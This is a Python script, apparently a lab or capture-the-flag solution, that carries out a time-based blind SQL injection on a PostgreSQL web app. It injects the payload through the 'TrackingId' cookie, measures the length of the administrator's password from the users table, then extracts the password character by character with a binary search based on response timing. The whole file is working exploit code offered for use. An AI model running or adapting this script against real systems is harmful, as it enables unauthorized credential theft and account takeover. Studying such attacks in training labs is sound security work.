import helper
from datetime import datetime
import ast
import signal
import string
import sys
from bsqli import SqliHttpRequest
from bsqli import SqliHttpResponse
from bsqli import binary_search
from bsqli import linear_search

TIMEOUT = 5

def password_size_handler(val, op, pos):
  sql_passwd_inj = "LENGTH((SELECT password FROM users WHERE username = 'administrator')) {} '{}'".format(op, val)
  sql = helper.sqli_cond_timeout(sql_passwd_inj, 'PostgreSQL', TIMEOUT)
  req.inject('cookie', 'TrackingId', sql)
  # print(req._prepare_request())
  resp = req.get()
  # print(f"elapsed: {resp.elapsed} type: {type(resp.elapsed)} {resp.elapsed.seconds}")
  if not resp.status_code in [200, 500]:
    print(f"HTTP Request failed with code {resp.status_code}")
    exit(1)

  success = resp.elapsed.seconds in range(TIMEOUT - 2, TIMEOUT + 2)
  # if success:
  #   print(f"{val} {op} {pos}")
  
  return success

def password_search_handler(val, op, pos):
  sql_passwd_inj = "SUBSTR((SELECT password FROM users WHERE username = 'administrator'), {}, 1) {} '{}'".format(pos, op, val)
  sql = helper.sqli_cond_timeout(sql_passwd_inj, 'PostgreSQL', TIMEOUT)
  req.inject('cookie', 'TrackingId', sql)
  resp = req.get()
  if not resp.status_code in [200, 500]:
    print(f"HTTP Request failed with code {resp.status_code}")
    exit(1)

  success = resp.elapsed.seconds in range(TIMEOUT - 2, TIMEOUT + 2)
  # if success and op == '=':
  #   print(f"{val} {op} {pos}")
  
  return success

if __name__ == "__main__":
  signal.signal(signal.SIGINT, helper.interrupt_handler)
  verbose, target, cookies = helper.args()
  data = helper.prepare_lc_alphanumeric_data()

  if verbose:
    print(target)
    print(cookies)
    print(data)
  
  req = SqliHttpRequest(target, helper.headers, cookies)
  print("extracting password length...")
  password_len = linear_search(list(range(10, 30)), password_size_handler, 1)

  if not password_len or password_len == 0:
    print('ERROR: failed to retrieve password length!')
    exit(1)

  print(f"password length: {password_len}")
  password = []
  for pos in range(1,int(password_len)+1):
    password.append(binary_search(data, password_search_handler, pos))
    print('extracting password [%d%%]\r'%(int(pos / password_len * 100)), end="")
  
  print("\nPassword: {}".format("".join(password)), flush=True)
